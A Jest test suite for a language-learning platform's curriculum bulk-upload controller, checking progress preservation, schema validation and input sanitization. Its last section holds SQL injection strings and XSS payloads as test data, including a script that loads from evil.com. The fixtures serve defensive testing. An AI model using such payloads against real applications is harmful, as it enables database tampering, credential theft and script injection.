const { sequelize } = require('../config/database');
require('../models/associations');
const CurriculumLesson = require('../models/CurriculumLesson');
const UserNodeProgress = require('../models/UserNodeProgress');
const User = require('../models/User');
const curriculumController = require('../controllers/curriculumController');
const { validateLessonStages, sanitizeLessonStages } = require('../utils/stageSanitizer');

/**
 * Mock Express Response helper for controller execution
 */
const createMockRes = () => {
    const res = {};
    res.statusCode = 200;
    res.status = jest.fn().mockImplementation((code) => {
        res.statusCode = code;
        return res;
    });
    res.json = jest.fn().mockImplementation((data) => {
        res.body = data;
        return res;
    });
    return res;
};

describe('Curriculum & Bulk Upload Validation Suite', () => {
    let adminUser;
    let studentUser;

    beforeAll(async () => {
        // Synchronize in-memory SQLite tables
        await sequelize.sync({ force: true });

        adminUser = await User.create({
            name: 'Admin Trainer',
            email: 'admin_bulk@dolphincoder.com',
            password: 'HashedPassword123!',
            role: 'admin',
            isEmailVerified: true,
        });

        studentUser = await User.create({
            name: 'Max Mustermann',
            email: 'max_student@test.com',
            password: 'HashedPassword123!',
            role: 'student',
            isEmailVerified: true,
        });
    });

    beforeEach(async () => {
        await CurriculumLesson.destroy({ where: {} });
        await UserNodeProgress.destroy({ where: {} });
    });

    afterAll(async () => {
        try {
            await sequelize.close();
        } catch (_) {}
    });

    // =========================================================================
    // 1. UNIT-BY-UNIT BULK UPLOAD CONFLICT RESOLUTION
    // =========================================================================
    describe('1. Unit-by-Unit Bulk Upload Conflict Resolution', () => {
        it('preserves UserNodeProgress on untouched lessons when updating an existing unit with edited and new lessons', async () => {
            const courseId = 'de_en_a1';

            // Seed initial Unit 1 with 3 lessons
            const lesson0 = await CurriculumLesson.create({
                owner: adminUser.id,
                learningLanguage: 'de',
                nativeLanguage: 'en',
                level: 'A1',
                unitNumber: 1,
                unitTitle: 'Coral Reef Greetings',
                lessonIndex: 0,
                title: 'Lesson 0: Basics & Greetings',
                subtitle: 'Essential greetings',
                nodeType: 'lesson',
                xpReward: 15,
                pearlsReward: 5,
                isLive: true,
                stages: [
                    {
                        type: 'word_match',
                        pairs: [
                            { target: 'Hallo', native: 'Hello' },
                            { target: 'Tschüss', native: 'Bye' },
                        ],
                    },
                ],
            });

            const lesson1 = await CurriculumLesson.create({
                owner: adminUser.id,
                learningLanguage: 'de',
                nativeLanguage: 'en',
                level: 'A1',
                unitNumber: 1,
                unitTitle: 'Coral Reef Greetings',
                lessonIndex: 1,
                title: 'Lesson 1: Numbers 1-10',
                subtitle: 'Count to ten',
                nodeType: 'lesson',
                xpReward: 15,
                pearlsReward: 5,
                isLive: true,
                stages: [
                    {
                        type: 'word_match',
                        pairs: [
                            { target: 'Eins', native: 'One' },
                            { target: 'Zwei', native: 'Two' },
                        ],
                    },
                ],
            });

            const lesson2 = await CurriculumLesson.create({
                owner: adminUser.id,
                learningLanguage: 'de',
                nativeLanguage: 'en',
                level: 'A1',
                unitNumber: 1,
                unitTitle: 'Coral Reef Greetings',
                lessonIndex: 2,
                title: 'Lesson 2: Colors',
                subtitle: 'Basic colors',
                nodeType: 'lesson',
                xpReward: 15,
                pearlsReward: 5,
                isLive: true,
                stages: [
                    {
                        type: 'word_match',
                        pairs: [
                            { target: 'Rot', native: 'Red' },
                            { target: 'Blau', native: 'Blue' },
                        ],
                    },
                ],
            });

            // Student completes lesson 0 and unlocks lesson 1
            const completionDate = new Date('2026-10-31T10:00:00Z');
            await UserNodeProgress.create({
                userId: studentUser.id,
                courseId,
                nodeIndex: 0,
                status: 'completed',
                stars: 3,
                scorePct: 100,
                completedAt: completionDate,
            });

            await UserNodeProgress.create({
                userId: studentUser.id,
                courseId,
                nodeIndex: 1,
                status: 'available',
                stars: 1,
                scorePct: 75,
                completedAt: null,
            });

            // Admin performs bulk upload updating Lesson 1 with new title/stages, and adding Lesson 3 (Family)
            // Lesson 0 and Lesson 2 are untouched
            const uploadPayload = {
                learningLanguage: 'de',
                nativeLanguage: 'en',
                level: 'A1',
                unitNumber: 1,
                unitTitle: 'Coral Reef Greetings',
                lessonsData: [
                    {
                        id: lesson1.id,
                        lessonIndex: 1,
                        title: 'Lesson 1: Numbers 1-20 (Expanded)',
                        subtitle: 'Count up to twenty',
                        nodeType: 'lesson',
                        xpReward: 25,
                        stages: [
                            {
                                type: 'word_match',
                                pairs: [
                                    { target: 'Eins', native: 'One' },
                                    { target: 'Zwanzig', native: 'Twenty' },
                                ],
                            },
                        ],
                    },
                    {
                        title: 'Lesson 3: Family Members',
                        subtitle: 'Father, mother, sister',
                        nodeType: 'lesson',
                        xpReward: 20,
                        stages: [
                            {
                                type: 'word_match',
                                pairs: [
                                    { target: 'Vater', native: 'Father' },
                                    { target: 'Mutter', native: 'Mother' },
                                ],
                            },
                        ],
                    },
                ],
            };

            const req = { user: adminUser, body: uploadPayload };
            const res = createMockRes();

            await curriculumController.bulkUpload(req, res, () => {});

            expect(res.statusCode).toBe(201);
            expect(res.body.success).toBe(true);

            // 1. Verify untouched lesson 0 preserves student progress completely
            const untouchedProgress0 = await UserNodeProgress.findOne({
                where: { userId: studentUser.id, courseId, nodeIndex: 0 },
            });
            expect(untouchedProgress0).not.toBeNull();
            expect(untouchedProgress0.status).toBe('completed');
            expect(untouchedProgress0.stars).toBe(3);
            expect(untouchedProgress0.scorePct).toBe(100);
            expect(new Date(untouchedProgress0.completedAt).toISOString()).toBe(completionDate.toISOString());

            // 2. Verify untouched lesson 0 record in CurriculumLesson has not been mutated
            const untouchedLesson0 = await CurriculumLesson.findByPk(lesson0.id);
            expect(untouchedLesson0).not.toBeNull();
            expect(untouchedLesson0.title).toBe('Lesson 0: Basics & Greetings');
            expect(untouchedLesson0.lessonIndex).toBe(0);

            // 3. Verify lesson 1 was updated in-place with the same primary key
            const updatedLesson1 = await CurriculumLesson.findByPk(lesson1.id);
            expect(updatedLesson1).not.toBeNull();
            expect(updatedLesson1.title).toBe('Lesson 1: Numbers 1-20 (Expanded)');
            expect(updatedLesson1.xpReward).toBe(25);
            expect(updatedLesson1.lessonIndex).toBe(1);

            // 4. Verify course hierarchy integrity
            const unitLessons = await CurriculumLesson.findAll({
                where: { learningLanguage: 'de', nativeLanguage: 'en', level: 'A1', unitNumber: 1 },
                order: [['lessonIndex', 'ASC']],
            });

            expect(unitLessons.length).toBe(4);
            const indices = unitLessons.map(l => l.lessonIndex);
            expect(indices).toEqual([0, 1, 2, 3]);

            const titles = unitLessons.map(l => l.title);
            expect(titles).toEqual([
                'Lesson 0: Basics & Greetings',
                'Lesson 1: Numbers 1-20 (Expanded)',
                'Lesson 2: Colors',
                'Lesson 3: Family Members',
            ]);
        });

        it('preserves multi-user progress across concurrent students during bulk upload updates', async () => {
            const courseId = 'de_en_a1';

            const secondStudent = await User.create({
                name: 'Erika Musterfrau',
                email: 'erika_student@test.com',
                password: 'HashedPassword123!',
                role: 'student',
                isEmailVerified: true,
            });

            // Create initial lesson
            const existingLesson = await CurriculumLesson.create({
                owner: adminUser.id,
                learningLanguage: 'de',
                nativeLanguage: 'en',
                level: 'A1',
                unitNumber: 2,
                lessonIndex: 0,
                title: 'Unit 2 Lesson 0: Alphabet',
                isLive: true,
                stages: [
                    {
                        type: 'word_match',
                        pairs: [{ target: 'A', native: 'A' }, { target: 'B', native: 'B' }],
                    },
                ],
            });

            // Student 1 progress
            await UserNodeProgress.create({
                userId: studentUser.id,
                courseId,
                nodeIndex: 0,
                status: 'completed',
                stars: 3,
                scorePct: 100,
            });

            // Student 2 progress
            await UserNodeProgress.create({
                userId: secondStudent.id,
                courseId,
                nodeIndex: 0,
                status: 'completed',
                stars: 2,
                scorePct: 85,
            });

            // Bulk upload appends new lessons to Unit 2
            const req = {
                user: adminUser,
                body: {
                    learningLanguage: 'de',
                    nativeLanguage: 'en',
                    level: 'A1',
                    unitNumber: 2,
                    conflictResolution: 'append',
                    lessonsData: [
                        {
                            title: 'Unit 2 Lesson 1: Vowels',
                            stages: [
                                {
                                    type: 'word_match',
                                    pairs: [{ target: 'E', native: 'E' }, { target: 'O', native: 'O' }],
                                },
                            ],
                        },
                    ],
                },
            };
            const res = createMockRes();

            await curriculumController.bulkUpload(req, res, () => {});
            expect(res.statusCode).toBe(201);

            // Verify both students' progress on node 0 remains untouched
            const s1Progress = await UserNodeProgress.findOne({
                where: { userId: studentUser.id, courseId, nodeIndex: 0 },
            });
            const s2Progress = await UserNodeProgress.findOne({
                where: { userId: secondStudent.id, courseId, nodeIndex: 0 },
            });

            expect(s1Progress.stars).toBe(3);
            expect(s1Progress.scorePct).toBe(100);
            expect(s2Progress.stars).toBe(2);
            expect(s2Progress.scorePct).toBe(85);

            // Verify hierarchy in Unit 2
            const unit2Lessons = await CurriculumLesson.findAll({
                where: { unitNumber: 2 },
                order: [['lessonIndex', 'ASC']],
            });
            expect(unit2Lessons.length).toBe(2);
            expect(unit2Lessons[0].id).toBe(existingLesson.id);
            expect(unit2Lessons[0].lessonIndex).toBe(0);
            expect(unit2Lessons[1].lessonIndex).toBe(1);
        });

        it('maintains course hierarchy integrity in getUnitsSummary projection after bulk updates', async () => {
            // Seed Unit 1 with 2 lessons and Unit 2 with 1 lesson
            await CurriculumLesson.create({
                owner: adminUser.id,
                learningLanguage: 'de',
                nativeLanguage: 'en',
                level: 'A1',
                unitNumber: 1,
                lessonIndex: 0,
                title: 'U1 L0',
                isLive: true,
            });
            await CurriculumLesson.create({
                owner: adminUser.id,
                learningLanguage: 'de',
                nativeLanguage: 'en',
                level: 'A1',
                unitNumber: 1,
                lessonIndex: 1,
                title: 'U1 L1',
                isLive: false,
            });
            await CurriculumLesson.create({
                owner: adminUser.id,
                learningLanguage: 'de',
                nativeLanguage: 'en',
                level: 'A1',
                unitNumber: 2,
                lessonIndex: 0,
                title: 'U2 L0',
                isLive: true,
            });

            // Verify getUnitsSummary accurately groups units and aggregates live/draft counts
            const summaryReq = { query: { learningLanguage: 'de', nativeLanguage: 'en', level: 'A1' } };
            const summaryRes = createMockRes();

            await curriculumController.getUnitsSummary(summaryReq, summaryRes, () => {});

            expect(summaryRes.statusCode).toBe(200);
            expect(summaryRes.body.totalUnits).toBe(2);

            const u1 = summaryRes.body.units.find(u => u.unitNumber === 1);
            expect(u1).toBeDefined();
            expect(u1.totalLessons).toBe(2);
            expect(u1.liveLessons).toBe(1);
            expect(u1.draftLessons).toBe(1);
            expect(u1.sectionNumber).toBe(1);

            const u2 = summaryRes.body.units.find(u => u.unitNumber === 2);
            expect(u2).toBeDefined();
            expect(u2.totalLessons).toBe(1);
            expect(u2.liveLessons).toBe(1);
        });

        it('automatically respects root-level unitNumber, unitTitle, and languages declared in uploaded JSON file even if req.body has stale default unitNumber', async () => {
            // Simulate user being on unit 1 (or default req.body.unitNumber = 1), but uploading a Unit 2 curriculum file
            const unit2FileContent = JSON.stringify({
                courseTitle: 'English A1 Comprehensive Curriculum (For Hindi Speakers)',
                learningLanguage: 'en',
                nativeLanguage: 'hi',
                level: 'A1',
                unitNumber: 2,
                unitTitle: 'Food, Drinks & Temperatures',
                unitDescription: 'खान-पान और तापमान',
                lessons: [
                    {
                        lessonIndex: 0,
                        title: 'Food & Drinks • Lesson 1',
                        subtitle: 'Hot & cold drinks',
                        nodeType: 'lesson',
                        xpReward: 15,
                        pearlsReward: 5,
                        stages: [
                            {
                                type: 'word_match',
                                pairs: [
                                    { target: 'water', native: 'पानी' },
                                    { target: 'tea', native: 'चाय' },
                                ],
                            },
                        ],
                    },
                ],
            });

            const uploadReq = {
                user: adminUser,
                body: {
                    learningLanguage: 'en',
                    nativeLanguage: 'hi',
                    level: 'A1',
                    unitNumber: 1, // Stale unit number from UI state
                    unitTitle: 'Coral Reef',
                    lessonsData: unit2FileContent,
                },
            };
            const uploadRes = createMockRes();

            await curriculumController.bulkUpload(uploadReq, uploadRes, () => {});

            expect(uploadRes.statusCode).toBe(201);
            expect(uploadRes.body.unitNumber).toBe(2);
            expect(uploadRes.body.unitTitle).toBe('Food, Drinks & Temperatures');

            // Verify lessons were saved under unitNumber = 2, NOT unitNumber = 1
            const lessonsInUnit2 = await CurriculumLesson.findAll({
                where: {
                    learningLanguage: 'en',
                    nativeLanguage: 'hi',
                    level: 'A1',
                    unitNumber: 2,
                },
            });

            expect(lessonsInUnit2.length).toBe(1);
            expect(lessonsInUnit2[0].unitNumber).toBe(2);
            expect(lessonsInUnit2[0].unitTitle).toBe('Food, Drinks & Temperatures');
            expect(lessonsInUnit2[0].unitDescription).toBe('खान-पान और तापमान');

            const lessonsInUnit1 = await CurriculumLesson.findAll({
                where: {
                    learningLanguage: 'en',
                    nativeLanguage: 'hi',
                    level: 'A1',
                    unitNumber: 1,
                },
            });
            expect(lessonsInUnit1.length).toBe(0);
        });
    });

    // =========================================================================
    // 2. MALFORMED CHALLENGE SCHEMA REJECTION
    // =========================================================================
    describe('2. Malformed Challenge Schema Rejection', () => {
        it('rejects word_match with fewer than 2 pairs with descriptive error before writing to DB', async () => {
            const malformedLessons = [
                {
                    title: 'Invalid Word Match Lesson',
                    stages: [
                        {
                            type: 'word_match',
                            title: 'Match the pair',
                            pairs: [
                                { target: 'Wasser', native: 'Water' }, // Only 1 pair!
                            ],
                        },
                    ],
                },
            ];

            const req = {
                user: adminUser,
                body: {
                    learningLanguage: 'de',
                    nativeLanguage: 'en',
                    level: 'A1',
                    unitNumber: 1,
                    lessonsData: malformedLessons,
                },
            };
            const res = createMockRes();

            await curriculumController.bulkUpload(req, res, () => {});

            expect(res.statusCode).toBe(400);
            expect(res.body.success).toBe(false);
            expect(res.body.message).toMatch(/word_match requires at least 2 valid pairs/i);
            expect(res.body.errors).toBeDefined();

            // Verify zero records were written to the database
            const count = await CurriculumLesson.count();
            expect(count).toBe(0);
        });

        it('rejects word_match with empty or whitespace-only pairs', async () => {
            const malformedLessons = [
                {
                    title: 'Blank Word Match Lesson',
                    stages: [
                        {
                            type: 'word_match',
                            pairs: [
                                { target: '   ', native: 'Water' },
                                { target: 'Brot', native: '   ' },
                            ],
                        },
                    ],
                },
            ];

            const req = {
                user: adminUser,
                body: {
                    learningLanguage: 'de',
                    nativeLanguage: 'en',
                    level: 'A1',
                    unitNumber: 1,
                    lessonsData: malformedLessons,
                },
            };
            const res = createMockRes();

            await curriculumController.bulkUpload(req, res, () => {});

            expect(res.statusCode).toBe(400);
            expect(res.body.message).toMatch(/word_match requires at least 2 valid pairs/i);

            const count = await CurriculumLesson.count();
            expect(count).toBe(0);
        });

        it('rejects picture_select with missing options array before writing to DB', async () => {
            const malformedLessons = [
                {
                    title: 'Missing Options Picture Select',
                    stages: [
                        {
                            type: 'picture_select',
                            prompt: 'Choose the correct picture for "der Apfel"',
                            // options is completely omitted!
                        },
                    ],
                },
            ];

            const req = {
                user: adminUser,
                body: {
                    learningLanguage: 'de',
                    nativeLanguage: 'en',
                    level: 'A1',
                    unitNumber: 1,
                    lessonsData: malformedLessons,
                },
            };
            const res = createMockRes();

            await curriculumController.bulkUpload(req, res, () => {});

            expect(res.statusCode).toBe(400);
            expect(res.body.success).toBe(false);
            expect(res.body.message).toMatch(/picture_select missing options/i);

            const count = await CurriculumLesson.count();
            expect(count).toBe(0);
        });

        it('rejects picture_select with empty options array or blank options', async () => {
            const malformedLessons = [
                {
                    title: 'Empty Options Picture Select',
                    stages: [
                        {
                            type: 'picture_select',
                            prompt: 'Choose picture',
                            options: [], // Empty array
                        },
                    ],
                },
            ];

            const req = {
                user: adminUser,
                body: {
                    unitNumber: 1,
                    lessonsData: malformedLessons,
                },
            };
            const res = createMockRes();

            await curriculumController.bulkUpload(req, res, () => {});

            expect(res.statusCode).toBe(400);
            expect(res.body.message).toMatch(/picture_select missing options/i);

            const count = await CurriculumLesson.count();
            expect(count).toBe(0);
        });

        it('rejects cloze_test with empty sentence before writing to DB', async () => {
            const malformedLessons = [
                {
                    title: 'Blank Sentence Cloze',
                    stages: [
                        {
                            type: 'cloze_test',
                            sentence: '   ', // Blank sentence
                            blank: 'komme',
                        },
                    ],
                },
            ];

            const req = {
                user: adminUser,
                body: {
                    unitNumber: 1,
                    lessonsData: malformedLessons,
                },
            };
            const res = createMockRes();

            await curriculumController.bulkUpload(req, res, () => {});

            expect(res.statusCode).toBe(400);
            expect(res.body.success).toBe(false);
            expect(res.body.message).toMatch(/cloze_test requires a non-empty sentence/i);

            const count = await CurriculumLesson.count();
            expect(count).toBe(0);
        });

        it('rejects cloze_test with empty blank / answer before writing to DB', async () => {
            const malformedLessons = [
                {
                    title: 'Blank Answer Cloze',
                    stages: [
                        {
                            type: 'cloze_test',
                            sentence: 'Ich _____ aus Deutschland.',
                            blank: '', // Empty blank
                        },
                    ],
                },
            ];

            const req = {
                user: adminUser,
                body: {
                    unitNumber: 1,
                    lessonsData: malformedLessons,
                },
            };
            const res = createMockRes();

            await curriculumController.bulkUpload(req, res, () => {});

            expect(res.statusCode).toBe(400);
            expect(res.body.success).toBe(false);
            expect(res.body.message).toMatch(/cloze_test requires a non-empty blank/i);

            const count = await CurriculumLesson.count();
            expect(count).toBe(0);
        });

        it('enforces atomic batch upload validation: if one stage is malformed, entire batch is rejected with 0 DB writes', async () => {
            const mixedBatch = [
                {
                    title: 'Valid Lesson A',
                    stages: [
                        {
                            type: 'word_match',
                            pairs: [
                                { target: 'Ja', native: 'Yes' },
                                { target: 'Nein', native: 'No' },
                            ],
                        },
                    ],
                },
                {
                    title: 'Corrupted Lesson B',
                    stages: [
                        {
                            type: 'cloze_test',
                            sentence: '', // Malformed!
                            blank: 'Katze',
                        },
                    ],
                },
                {
                    title: 'Valid Lesson C',
                    stages: [
                        {
                            type: 'word_match',
                            pairs: [
                                { target: 'Bitte', native: 'Please' },
                                { target: 'Danke', native: 'Thank you' },
                            ],
                        },
                    ],
                },
            ];

            const req = {
                user: adminUser,
                body: {
                    unitNumber: 1,
                    lessonsData: mixedBatch,
                },
            };
            const res = createMockRes();

            await curriculumController.bulkUpload(req, res, () => {});

            expect(res.statusCode).toBe(400);
            expect(res.body.success).toBe(false);

            // Crucial: Valid Lesson A and Valid Lesson C must NOT be committed to DB
            const count = await CurriculumLesson.count();
            expect(count).toBe(0);
        });

        it('validates challenge stages directly via validateLessonStages utility', () => {
            // Valid stages
            const valid = validateLessonStages([
                {
                    type: 'word_match',
                    pairs: [{ target: 'Hund', native: 'Dog' }, { target: 'Katze', native: 'Cat' }],
                },
                {
                    type: 'picture_select',
                    options: [{ text: 'Apfel', imageUrl: '/uploads/apple.webp' }],
                },
                {
                    type: 'cloze_test',
                    sentence: 'Das ist ein _____.',
                    blank: 'Buch',
                },
            ]);
            expect(valid.isValid).toBe(true);
            expect(valid.errors).toHaveLength(0);

            // Invalid word_match (<2 pairs)
            const invalidMatch = validateLessonStages([
                { type: 'word_match', pairs: [{ target: 'Eins', native: 'One' }] },
            ]);
            expect(invalidMatch.isValid).toBe(false);
            expect(invalidMatch.errors[0]).toMatch(/word_match requires at least 2 valid pairs/i);

            // Invalid picture_select (empty options)
            const invalidPic = validateLessonStages([
                { type: 'picture_select', options: [] },
            ]);
            expect(invalidPic.isValid).toBe(false);
            expect(invalidPic.errors[0]).toMatch(/picture_select missing options/i);

            // Invalid cloze_test (missing blank)
            const invalidCloze = validateLessonStages([
                { type: 'cloze_test', sentence: 'Hallo _____', blank: '' },
            ]);
            expect(invalidCloze.isValid).toBe(false);
            expect(invalidCloze.errors[0]).toMatch(/cloze_test requires a non-empty blank/i);
        });
    });

    // =========================================================================
    // 3. PAYLOAD SANITIZATION & INJECTION PREVENTION
    // =========================================================================
    describe('3. Payload Sanitization & Injection Prevention', () => {
        it('safely handles SQL injection fragments in stages JSON via Sequelize ORM parameterization', async () => {
            const maliciousSqlInjections = [
                "Robert'); DROP TABLE CurriculumLessons; --",
                "' OR '1'='1",
                "\" OR 1=1; --",
                "'; UPDATE users SET role='admin' WHERE '1'='1'; --",
                "UNION SELECT id, email, password FROM users --",
            ];

            const maliciousStages = [
                {
                    type: 'word_match',
                    pairs: [
                        { target: maliciousSqlInjections[0], native: 'Little Bobby Tables' },
                        { target: maliciousSqlInjections[1], native: 'Always True Injection' },
                    ],
                },
                {
                    type: 'cloze_test',
                    sentence: `SELECT * FROM secret_table WHERE name = '${maliciousSqlInjections[2]}'`,
                    blank: maliciousSqlInjections[3],
                },
            ];

            const req = {
                user: adminUser,
                body: {
                    title: 'SQL Injection Resiliency Lesson',
                    learningLanguage: 'de',
                    nativeLanguage: 'en',
                    level: 'A1',
                    unitNumber: 1,
                    stages: maliciousStages,
                },
            };
            const res = createMockRes();

            await curriculumController.createLesson(req, res, () => {});

            expect(res.statusCode).toBe(201);
            expect(res.body.success).toBe(true);
            const createdLessonId = res.body.lesson.id;

            // 1. Verify CurriculumLessons table still exists and is not dropped
            const tableCheck = await CurriculumLesson.count();
            expect(tableCheck).toBeGreaterThan(0);

            // 2. Verify Users table still exists and roles are not escalated
            const studentCheck = await User.findByPk(studentUser.id);
            expect(studentCheck).not.toBeNull();
            expect(studentCheck.role).toBe('student');

            // 3. Verify retrieved lesson stages preserve the SQL string safely as literal content
            const fetchedLesson = await CurriculumLesson.findByPk(createdLessonId);
            expect(fetchedLesson).not.toBeNull();

            const stages = fetchedLesson.stages;
            expect(stages).toHaveLength(2);
            expect(stages[0].pairs[0].target).toBe(maliciousSqlInjections[0]);
            expect(stages[0].pairs[1].target).toBe(maliciousSqlInjections[1]);
            expect(stages[1].blank).toBe(maliciousSqlInjections[3]);
        });

        it('sanitizes and strips script injection (XSS) in modular stages JSON', async () => {
            const xssStages = [
                {
                    type: 'word_match',
                    pairs: [
                        {
                            target: '<script>alert("XSS")</script>Guten Tag',
                            native: '<script src="https://evil.com/malware.js"></script>Hello',
                        },
                        {
                            target: 'Danke<script>window.location="http://phishing.site"</script>',
                            native: 'Thank you',
                        },
                    ],
                },
                {
                    type: 'cloze_test',
                    sentence: 'Ich bin <script>document.cookie="stolen"</script>Anna.',
                    blank: '<script>eval("alert(1)")</script>komme',
                },
            ];

            const req = {
                user: adminUser,
                body: {
                    title: 'XSS Sanitization Lesson',
                    learningLanguage: 'de',
                    nativeLanguage: 'en',
                    level: 'A1',
                    unitNumber: 1,
                    stages: xssStages,
                },
            };
            const res = createMockRes();

            await curriculumController.createLesson(req, res, () => {});

            expect(res.statusCode).toBe(201);
            const savedLesson = await CurriculumLesson.findByPk(res.body.lesson.id);
            const cleanStages = savedLesson.stages;

            // Verify that all <script> tags have been stripped
            expect(cleanStages[0].pairs[0].target).toBe('Guten Tag');
            expect(cleanStages[0].pairs[0].native).toBe('Hello');
            expect(cleanStages[0].pairs[1].target).toBe('Danke');
            expect(cleanStages[1].sentence).toBe('Ich bin Anna.');
            expect(cleanStages[1].blank).toBe('komme');

            // Ensure no <script> tag exists in the raw JSON string
            const rawStagesText = JSON.stringify(cleanStages);
            expect(rawStagesText).not.toContain('<script>');
            expect(rawStagesText).not.toContain('</script>');
            expect(rawStagesText).not.toContain('evil.com');
        });

        it('safely handles combined SQL and script injection during bulk upload without corrupting existing progress', async () => {
            const courseId = 'de_en_a1';

            // Seed existing untouched lesson with student progress
            const safeLesson = await CurriculumLesson.create({
                owner: adminUser.id,
                learningLanguage: 'de',
                nativeLanguage: 'en',
                level: 'A1',
                unitNumber: 3,
                lessonIndex: 0,
                title: 'Safe Initial Lesson',
                isLive: true,
                stages: [
                    {
                        type: 'word_match',
                        pairs: [{ target: 'Ja', native: 'Yes' }, { target: 'Nein', native: 'No' }],
                    },
                ],
            });

            await UserNodeProgress.create({
                userId: studentUser.id,
                courseId,
                nodeIndex: 0,
                status: 'completed',
                stars: 3,
                scorePct: 100,
            });

            // Bulk upload a new lesson containing both SQL and script injection payloads
            const maliciousBulkPayload = {
                learningLanguage: 'de',
                nativeLanguage: 'en',
                level: 'A1',
                unitNumber: 3,
                lessonsData: [
                    {
                        title: 'Injected Lesson',
                        stages: [
                            {
                                type: 'word_match',
                                pairs: [
                                    {
                                        target: "<script>alert(1)</script>'; DROP TABLE user_node_progress; --",
                                        native: 'Dangerous Pair 1',
                                    },
                                    {
                                        target: 'UNION SELECT * FROM user_node_progress; --',
                                        native: '<script>alert(2)</script>Dangerous Pair 2',
                                    },
                                ],
                            },
                        ],
                    },
                ],
            };

            const req = { user: adminUser, body: maliciousBulkPayload };
            const res = createMockRes();

            await curriculumController.bulkUpload(req, res, () => {});

            expect(res.statusCode).toBe(201);
            expect(res.body.success).toBe(true);

            // 1. Verify user_node_progress table was NOT dropped
            const progressCount = await UserNodeProgress.count();
            expect(progressCount).toBe(1);

            // 2. Verify untouched student progress is completely intact
            const studentProgress = await UserNodeProgress.findOne({
                where: { userId: studentUser.id, courseId, nodeIndex: 0 },
            });
            expect(studentProgress).not.toBeNull();
            expect(studentProgress.status).toBe('completed');
            expect(studentProgress.stars).toBe(3);
            expect(studentProgress.scorePct).toBe(100);

            // 3. Verify newly created lesson has parameterized SQL and stripped script tags
            const injectedLesson = await CurriculumLesson.findOne({
                where: { unitNumber: 3, lessonIndex: 1 },
            });
            expect(injectedLesson).not.toBeNull();
            const stages = injectedLesson.stages;
            expect(stages[0].pairs[0].target).toBe("'; DROP TABLE user_node_progress; --");
            expect(stages[0].pairs[1].native).toBe('Dangerous Pair 2');
            expect(JSON.stringify(stages)).not.toContain('<script>');
        });
    });
});
